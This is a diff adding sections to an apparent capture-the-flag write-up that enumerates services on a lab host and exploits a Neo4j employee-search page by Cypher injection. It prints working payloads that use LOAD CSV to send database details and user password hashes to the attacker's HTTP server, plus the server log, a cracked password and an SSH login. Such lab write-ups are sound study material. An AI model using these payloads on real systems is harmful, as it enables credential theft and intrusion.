@@ -294,5 +294,76 @@ The chisel binary is then uploaded to the targets `/tmp/` dir and ran in client 
 
 ## Info gathering round 2
 
-### Port 3000
+### Port 3000 (cogs)
+Interesting:
+- Gogs: self hosted git repos
+- users noted: administrator, John
+
+### Port 8001 (demo site)
+Interesting:
+- Demo management site, uses admin:admin creds
+- Has an employee search which seems to target a database.
+    - It 500 errors when a `'` is included
+
+### Port 7474 (neo4j)
+Interesting:
+- Neo4j default creds do not work
+
+## neo4j injection
+
+I'm new when it comes to cypher injection, i can think about it in terms of sql injection in this specific instance but i know there are more interesting things involved here..
+The injectable page is on the employee search page.
+
+![Neo4j injection]()
+
+```
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.65:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+```
+```
+10.10.11.210 - - [07/May/2023 15:07:18] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
+```
+From this injection we can see version 5.6 of neo4j, but as per usual we are looking for a way to gain more access, in this case we should look to user accounts we could potentially make use of.
+
+```
+1' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.65:8000/?l='+label as l RETURN 0 as _0 //
+```
+
+```
+10.10.11.210 - - [07/May/2023 15:20:15] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:15] "GET /?l=employee HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
+```
+
+We can already see the employee labelled in the actual app, so i will try and load the user labels.
+
+```
+1' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.65:8000/?'+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+```
+10.10.11.210 - - [07/May/2023 15:25:16] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:25:16] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:25:16] "GET /?username=john HTTP/1.1" 200 -
+10.10.11.210 - - [07/May/2023 15:25:16] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+```
+
+Well these look like hashes, may as well put them through hashcat or john if that doesn't work..
+Well that was easy enough, not very good passwords, but where are they used? not in cogs. not in neo4j... well maybe john:ThisIs4You will work on ssh?..
+
+```
+ssh john@10.10.11.210         
+john@10.10.11.210's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
+
+```
+
+wow that was a little tricky, but i guess this is what custom password lists are for.
+
 
